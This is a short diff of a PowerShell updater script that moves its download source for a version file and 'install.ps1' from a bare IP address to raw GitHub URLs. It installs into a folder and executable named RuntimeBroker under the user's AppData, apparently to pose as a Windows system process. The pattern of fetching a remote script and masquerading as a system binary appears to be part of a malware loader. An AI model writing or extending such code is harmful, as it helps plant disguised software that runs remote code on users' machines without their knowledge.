@@ -1,6 +1,6 @@
 ﻿# Define the URLs and paths
-$versionUrl = "http://116.203.93.143/00_update/version"
-$scriptUrl = "http://116.203.93.143/00_update/install.ps1"
+$versionUrl = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/version"
+$scriptUrl = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/install.ps1"
 $appDataPath = "C:\Users\$env:USERNAME\AppData"
 $currentDir = "$appDataPath\Local\Microsoft\RuntimeBroker"
 $assemblyFile = "$currentDir\RuntimeBroker.exe"
